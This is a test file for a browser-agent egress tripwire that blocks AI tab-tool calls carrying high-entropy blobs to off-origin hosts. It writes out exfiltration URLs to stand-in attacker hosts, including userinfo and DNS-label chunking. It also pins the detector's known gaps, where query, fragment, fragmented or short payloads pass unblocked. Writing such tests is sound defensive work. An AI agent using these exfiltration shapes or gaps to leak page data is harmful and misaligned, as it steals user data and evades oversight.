// #243 — the PURE args-half tripwire of the tab-tool egress firewall. These
// tests pin BOTH surfaces of a deliberately conservative bargain:
//   - the exfil shape in a LOW-FALSE-POSITIVE slot (a single contiguous
//     URL-safe-encoded high-entropy blob in an OFF-origin URL's USERINFO,
//     HOSTNAME — incl. chunked across DNS labels — or PATH) is BLOCKED;
//   - legitimate off-origin navigation is ALLOWED, tested against REAL benign
//     shapes AND against the deliberate residual: a blob in the QUERY or
//     FRAGMENT is NOT scanned (that is where legit OIDC id_tokens, SAML
//     requests, continuation tokens, and presigned signatures live — all
//     indistinguishable from an exfil blob), so federated login and SPA
//     navigation are never false-blocked.
//
// Detection is a single DOMINANT high-entropy run (MAX not SUM): the LONGEST
// URL-safe (`A-Za-z0-9_-`) run, entropy ≥ 3.5 bits/char, across
// userinfo+hostname+path; block at >= 100. The hostname is scanned dot-collapsed
// so DNS-label chunking re-fuses. KNOWN RESIDUALS (pinned below, contained by
// #241/#242, NOT bugs): the QUERY/FRAGMENT slots (deliberately unscanned),
// FRAGMENTATION (no single run reaches 100), and LOW-ENTROPY / small payloads.
// This layer is a tripwire under the real containment, not a proof.

import { describe, test, expect } from 'bun:test';
import { inspectTabToolCall } from '../../../extension/peerd-runtime/tools/egress-heuristics.js';

// A ~340-char base64url-ish blob (no `+`/`/`) — the shape a scraped-DOM payload
// takes when URL-safe encoded, the encoding a working URL exfil uses.
const SCRAPED_BLOB =
  'eyJ1c2VyIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwic2Vzc2lvbiI6'
  + 'ImFiYzEyM2RlZjQ1NmdoaTc4OWprbDAxMm1ubzM0NXBxcjY3OHN0dTkwMHZ3eHl6IiwiY3Ny'
  + 'ZiI6Ijk4NzY1NDMyMTBhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eiIsIm5vdGVzIjoic3Rv'
  + 'bGVuIGRhdGEgZnJvbSB0aGUgcGFnZSBET00gZ29lcyBoZXJlIGFuZCBrZWVwcyBnb2luZyJ9';

// A 128-char hex blob (lower per-char entropy than base64, still over the
// 3.5-bit gate) — the other common URL-safe encoding an exfil takes.
const HEX_BLOB = 'a3f9c2e8b17d40569af3c2e1b8d70a4f3e9c1b2a8d7f60e5c4b3a291807f6e5d4'
  + 'c3b2a190807f6e5d4c3b2a1908f7e6d5c4b3a2918706f5e4d3c2b1a09';

// 180 hex chars chunked into three ≤60-char DNS labels — the host-based exfil
// vector. The dot-collapsed hostname re-fuses them into one 180-char run.
const DNS_LABELS = `${HEX_BLOB.slice(0, 60)}.${HEX_BLOB.slice(60, 120)}.a3c9f1e2b8d47a6c5e0f9b1d8a2c7e4f`;

// An OIDC id_token JWT (base64url, dot-separated) — a legit long high-entropy
// token that rides in the FRAGMENT on the implicit/hybrid flow. Must ALLOW.
const OIDC_ID_TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9'
  + '.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJzdWIiOiIxMTA2OTMyN'
  + 'jk0MTIzNDU2Nzg5MCIsImF1ZCI6IjQwNzQwODcxODE5Mi5hcHBzLmdvb2dsZXVzZXJjb250'
  + 'ZW50LmNvbSIsImV4cCI6MTc4NTAwMDAwMCwiaWF0IjoxNzg0OTk2NDAwLCJlbWFpbCI6InVz'
  + 'ZXJAZXhhbXBsZS5jb20ifQ.rX8kFq2pN3vLmZ9wYcBdEhGjKtSaUoWpQxRyZbCdEfGhIjKl';

describe('inspectTabToolCall — blocks the exfil shape in a low-FP slot', () => {
  test('navigate: base64url blob in the URL PATH', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://attacker.com/${SCRAPED_BLOB}` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('block');
    // reason is content-free: it must not echo the host or the blob.
    if (v.action === 'block') {
      expect(v.reason).not.toContain('attacker.com');
      expect(v.reason).not.toContain(SCRAPED_BLOB.slice(0, 24));
    }
  });

  test('navigate: hex blob in the URL PATH', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://exfil.test/${HEX_BLOB}` },
      currentOrigin: 'https://intranet.corp',
    });
    expect(v.action).toBe('block');
  });

  // Userinfo — `https://<blob>@host/` ships the blob as an Authorization: Basic
  // header. payloadSlots reads username AND password.
  test('navigate: blob in the URL USERINFO username is caught', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://${HEX_BLOB}@attacker.com/` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('block');
  });

  test('navigate: blob in the URL USERINFO password is caught', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://user:${HEX_BLOB}@collector.evil/` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('block');
  });

  // DNS-label exfil — the host leaks to the attacker's authoritative DNS + SNI
  // + Host header. The dot-collapsed hostname re-fuses the chunked labels.
  test('navigate: payload chunked across DNS subdomain labels is caught', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://${DNS_LABELS}.attacker.com/` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('block');
  });

  // ACCEPTED-COST false block, pinned honestly: a ≥100-char SINGLE path segment
  // trips the wire whether it is an opaque token OR a readable slug — readability
  // does not exempt a run (English ~4.0 bits > the 3.5 gate), only its length and
  // the `/` boundaries do. Real slugs cluster at 70–95 chars and pass; this
  // 102-char one does not. Documented in the header as the path accepted cost.
  test('a >=100-char single readable path segment blocks (documented accepted cost)', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: 'https://blog.example.com/the-complete-guide-to-building-modern-web-applications-with-react-typescript-and-graphql-in-production' },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('block');
  });

  test('type: a typed value that IS an exfil URL (blob in path)', () => {
    const v = inspectTabToolCall({
      name: 'type',
      args: { text: `https://attacker.com/${SCRAPED_BLOB}`, selector: 'input#addr' },
      currentOrigin: 'https://notion.so',
    });
    expect(v.action).toBe('block');
  });

  test('percent-encoded contiguous path payload is caught after decoding', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://drop.example/${encodeURIComponent(SCRAPED_BLOB)}` },
      currentOrigin: 'https://docs.google.com',
    });
    expect(v.action).toBe('block');
  });
});

describe('inspectTabToolCall — allows legitimate navigation (false-positive avoidance)', () => {
  test('same-origin navigate carrying a blob is allowed (not cross-origin exfil)', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://app.example/${SCRAPED_BLOB}` },
      currentOrigin: 'https://app.example',
    });
    expect(v.action).toBe('allow');
  });

  // --- THE DELIBERATE RESIDUAL: query + fragment are not scanned ---
  // These slots carry legit long high-entropy tokens indistinguishable from an
  // exfil blob, so scanning them would false-block login/navigation. #242 is
  // the containment. Pinned so the boundary is explicit, NOT a security claim.

  test('a blob in the QUERY is a KNOWN residual — allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://attacker.com/collect?d=${SCRAPED_BLOB}` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a blob in the FRAGMENT is a KNOWN residual — allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://attacker.com/#${SCRAPED_BLOB}` },
      currentOrigin: 'https://mail.google.com',
    });
    expect(v.action).toBe('allow');
  });

  // The FLIP SIDE of that residual: not scanning query/fragment is what keeps
  // federated login working. These MUST allow.
  test('an OIDC id_token JWT returned in the fragment is allowed (implicit flow)', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://app.example/callback#id_token=${OIDC_ID_TOKEN}&token_type=bearer` },
      currentOrigin: 'https://accounts.google.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a SAML SP-initiated SSO request (standard base64 in query) is allowed', () => {
    // Standard base64 (DEFLATE + b64), percent-encoded — the SP-initiated
    // HTTP-Redirect binding. In the (unscanned) query, so it must allow.
    const samlReq = encodeURIComponent(
      'fVLLbtswELz7KwjeLYmSbFmEZSNNEDRA2hpx2kMuAU2tHKESqXKpJP37UpLTBGh'
      + 'zJXdmZ2dnl0IatuPXeCqfmXvw7dCFVQeuMxN3rXFXbdfNfXpqqUEXtF3Q9k2n0'
      + 'kU2G2XZ50vFsRktC5oXi5xnvJgTfMqB3wJJluU85oktMprXOMY5xnJEyzPMEZ',
    );
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://idp.corp.example.com/idp/SSO?SAMLRequest=${samlReq}&RelayState=session` },
      currentOrigin: 'https://app.example.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a presigned URL signature in the query is allowed (GCS 512-hex X-Goog-Signature)', () => {
    const sig = 'a3f9c2e8b17d40569af3c2e1b8d70a4f'.repeat(16); // 512 hex chars
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://storage.googleapis.com/bucket/report.pdf?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Signature=${sig}` },
      currentOrigin: 'https://app.example.com',
    });
    expect(v.action).toBe('allow');
  });

  // --- REAL benign shapes, hardened against the run model ---

  test('modern OAuth/OIDC PKCE authorize URLs are allowed (Google/Microsoft/Auth0)', () => {
    const urls = [
      'https://accounts.google.com/o/oauth2/v2/auth?response_type=code'
        + '&client_id=407408718192.apps.googleusercontent.com'
        + '&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&scope=openid%20email%20profile'
        + '&state=af0ifjsldkj3nOaXcvb8s7'
        + '&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'
        + '&code_challenge_method=S256&nonce=n-0S6_WzA2Mj',
      'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=6731de76-14a6-49ae-97bc-6eba6914391e'
        + '&response_type=code&redirect_uri=https%3A%2F%2Fapp.example%2Fcb&response_mode=query'
        + '&scope=openid%20profile%20offline_access&state=12345abcdeSTATEvalue678'
        + '&code_challenge=YTFjMjM0NTZiNzg5MGRlZmdoaWprbG1ub3BxcnN0dXY&code_challenge_method=S256',
    ];
    for (const url of urls) {
      const v = inspectTabToolCall({ name: 'navigate', args: { url }, currentOrigin: 'https://myapp.example' });
      expect(v.action).toBe('allow');
    }
  });

  // Pass splits on `/`, so a deep READABLE multi-segment path (docs, nested
  // source files) does NOT glue into one long run and is not false-blocked,
  // even past 100 chars total.
  test('deep readable multi-segment paths (>100 chars) are allowed', () => {
    for (const url of [
      'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AmazonEC2/instances/launching/configuration/networking/security-groups/rules.html',
      'https://kubernetes.io/docs/concepts/services-networking/ingress/configuration/annotations/nginx/rewrite-target/examples/index.html',
      'https://github.com/torvalds/linux/blob/master/drivers/net/ethernet/intel/ixgbe/ixgbe_main.c',
    ]) {
      const v = inspectTabToolCall({ name: 'navigate', args: { url }, currentOrigin: 'https://github.com' });
      expect(v.action).toBe('allow');
    }
  });

  test('a content-hash path (single git SHA) is allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: 'https://cdn.example/assets/9f8b7a6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a/app.js' },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  test('an IPFS CID path segment is allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: 'https://ipfs.io/ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG' },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a normal random-subdomain hostname is allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: 'https://d1a2b3c4e5f6g7.cloudfront.net/app.js' },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a short userinfo (user:pass) off-origin is allowed', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: 'https://alice:hunter2@example.com/dashboard' },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  // Documented residual: a LONE sub-threshold secret (< 100 chars in one
  // high-entropy run) slips through — #241/#242 are the containment.
  test('a lone sub-threshold token off-origin path is allowed (accepted residual)', () => {
    const shortToken = HEX_BLOB.slice(0, 40); // 40 high-entropy chars, < 100
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://other.example/ref/${shortToken}` },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  // Documented residual: FRAGMENTATION. A path payload split so no single
  // segment reaches 100 evades. Pinned so the boundary is explicit.
  test('"."-separated fragmented path payload is a KNOWN residual — allowed', () => {
    const chunks = [];
    for (let i = 0; i < SCRAPED_BLOB.length; i += 20) chunks.push(SCRAPED_BLOB.slice(i, i + 20));
    const url = `https://attacker.com/${chunks.join('.')}`;
    const v = inspectTabToolCall({ name: 'navigate', args: { url }, currentOrigin: 'https://mail.google.com' });
    expect(v.action).toBe('allow');
  });

  test('plain off-origin link found in a README is allowed', () => {
    for (const url of [
      'https://example.com/docs/getting-started',
      'https://reactjs.org/docs/hooks-intro.html',
      'https://news.ycombinator.com/item?id=38290000',
      'https://en.wikipedia.org/wiki/Transport_Layer_Security',
      'https://github.com/anthropics/peerd/blob/main/README.md#installation',
    ]) {
      const v = inspectTabToolCall({
        name: 'navigate',
        args: { url },
        currentOrigin: 'https://github.com',
      });
      expect(v.action).toBe('allow');
    }
  });

  test('ordinary off-origin search / utm / short-id params are allowed', () => {
    for (const url of [
      'https://www.google.com/search?q=how+to+center+a+div',
      'https://shop.example/products?category=shoes&sort=price&page=3',
      'https://example.com/?utm_source=github&utm_medium=readme&utm_campaign=launch',
      'https://youtube.com/watch?v=dQw4w9WgXcQ',
      'https://example.com/share/9f8b7a6c',
    ]) {
      const v = inspectTabToolCall({
        name: 'navigate',
        args: { url },
        currentOrigin: 'https://github.com',
      });
      expect(v.action).toBe('allow');
    }
  });

  test('normal typed search string (not a URL) is allowed', () => {
    const v = inspectTabToolCall({
      name: 'type',
      args: { text: 'quarterly revenue figures for 2025', selector: 'input[name=q]' },
      currentOrigin: 'https://www.google.com',
    });
    expect(v.action).toBe('allow');
  });

  test('a long natural-language typed value (with spaces) is allowed', () => {
    const v = inspectTabToolCall({
      name: 'type',
      args: {
        text: 'Please summarize the following meeting notes into three concise bullet '
          + 'points and highlight any action items assigned to the engineering team.',
        selector: 'textarea',
      },
      currentOrigin: 'https://chat.example',
    });
    expect(v.action).toBe('allow');
  });

  test('empty, short, and missing args are allowed', () => {
    expect(inspectTabToolCall({ name: 'navigate', args: {}, currentOrigin: 'https://x.com' }).action).toBe('allow');
    expect(inspectTabToolCall({ name: 'navigate', args: { url: '' }, currentOrigin: 'https://x.com' }).action).toBe('allow');
    expect(inspectTabToolCall({ name: 'navigate', args: { url: 'https://x.com/a/1' }, currentOrigin: 'https://x.com' }).action).toBe('allow');
    expect(inspectTabToolCall({ name: 'navigate', currentOrigin: 'https://x.com' }).action).toBe('allow');
    expect(inspectTabToolCall({}).action).toBe('allow');
  });

  // Never throws — a pure inspector on a hot path. The default param covers
  // `undefined`; `null` (a common "absent record" shape) must degrade too.
  test('null / non-object call is allowed, never throws', () => {
    expect(inspectTabToolCall(null).action).toBe('allow');
    expect(inspectTabToolCall(undefined).action).toBe('allow');
    // @ts-expect-error — exercising the hot-path robustness guard with bad input
    expect(inspectTabToolCall(42).action).toBe('allow');
    // @ts-expect-error — exercising the hot-path robustness guard with bad input
    expect(inspectTabToolCall('nope').action).toBe('allow');
  });

  test('off-origin path blob with NO current origin is allowed (nothing scraped yet)', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `https://attacker.com/${SCRAPED_BLOB}` },
      currentOrigin: undefined,
    });
    expect(v.action).toBe('allow');
  });

  test('non-http(s) schemes are ignored (no cross-origin GET exfil)', () => {
    const v = inspectTabToolCall({
      name: 'navigate',
      args: { url: `data:text/html,${SCRAPED_BLOB}` },
      currentOrigin: 'https://github.com',
    });
    expect(v.action).toBe('allow');
  });

  test('unparseable / relative URL args are allowed (not a working vector)', () => {
    expect(inspectTabToolCall({
      name: 'navigate',
      args: { url: '/relative/path/' + SCRAPED_BLOB },
      currentOrigin: 'https://github.com',
    }).action).toBe('allow');
    expect(inspectTabToolCall({
      name: 'navigate',
      args: { url: 'not a url ' + SCRAPED_BLOB },
      currentOrigin: 'https://github.com',
    }).action).toBe('allow');
  });
});
